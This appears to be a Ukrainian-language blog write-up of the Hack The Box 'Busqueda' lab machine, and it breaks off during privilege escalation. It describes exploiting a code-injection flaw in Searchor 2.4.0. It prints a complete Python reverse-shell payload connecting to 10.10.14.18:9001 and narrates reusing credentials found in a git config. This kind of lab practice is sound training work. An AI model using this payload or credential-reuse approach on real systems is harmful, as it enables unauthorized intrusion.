---
layout: post
title: "Hack The Box - Busqueda"
date: 2025-12-05
---

Hack the Box - Busqueda
Новий день - нова машина. Сьогодні лінуксовська easy тачка з SSTI і експлуатацією кастомних скриптів.
Почавши з базового Nmap - бачимо 2 відкриті TCP порти. Веб - 80 і SSH 22. Для другого в нас нема ні логіну, ні паролю, тому відкриваємо другий. І нас вітає ... не сайт, а помилка, що сервер перенаправив нас на searcher.htb(налаштовано як дефолтний сайт на сервері), 
але наш комп не знає, що це за сайт, тому ідемо в /etc/hosts і прописуємо - всі запити до searcher.htb слати на айпішник машини. І от нарешті, отримуємо сайт. Він займається тим що створює посилання на пошук на різних платформах і вертає нам силку. Внизу сайту вказаний фреймворк
`searchor 2.4.0`. По зову серця ідемо шукати публічні вразливості. І знаходимо - SSTI(коли сервер не фільтрує ввід і приймає введення як конструкції мови програмування, що дозволяє нам виконувати код). Тут я витратив трохи часу на те щоб знайти правильний пейлоад, і вставити в
правильне місце. Сам запит приймає платформу і пошукові слова. І от в останні вставляємо наступний пейлоад:
```
',import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.18",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")#
```
І відповідно netcat-ом ловимо шел. Але шел не простий - ~~Золотий~~ сирий, і половина команд нам буде казати, що хоче норм шел, а не щось написане на коліні. Один з простих способів апгрейднути шел -
`python3 -c 'import pty;pty.spawn("/bin/bash")'` - і система вважає що ми вже ~~дядько~~ в нормальному шелі. Ось юзер доступ на руках і ми ідемо далі - ескалація привілей, з якою я добряче задовбався. Але ми зробимо вигляд, що все завжди виходить з першого разу.
Так як експлуатували ми веб додаток, то і заходимо в систему в його папці(`/var/www/app/`), подивившись що і де, в цій же директорії знаходимо .git папку, яка свідчить, що цей файл десь зберігається в репозиторії(натяк). А в папці - config файл, насправді, в норм компаніях, 
на проді таке не роблять, але самі знаєте) І там же, в файлі - url всередині якої логін і пароль - до нашого нинішнього користувача. А сама лінка - gitea.searcher.htb, що наштовхує на думку - перевірити чи не маємо ми теж доступ. В той же `/etc/hosts` додаємо новий запит і в браузері бачимо сторінку gitea -
локальний мененджер гіт репозиторіїв. Скориставшись кредами, які щойно отримали - заходимо. А всередині знаходимо репозиторій з тією ж апкою, що тільки що ламали, тому не так цікаво. Але, в списку користувачів є ще й Administrator - може в нього є що цікаве?
Так чи інакше вертаємося в термінал і дивимося, що може наш юзер - `sudo -l` - виводить нам, що ми можемо запускати якийсь кастомний скріпт від імені root. Запускати, але не читати. Тому методом научного тику запускаємо. І скрипт дає нам список своїх можливостей 

1. Docker-ps(Скоріше за все `docker ps` під капотом)
2. Docker-insect(Скоріше за все `docker inspect` під капотом)
3. FullCheckup(Скоріше за все щось кастомне під капотом)
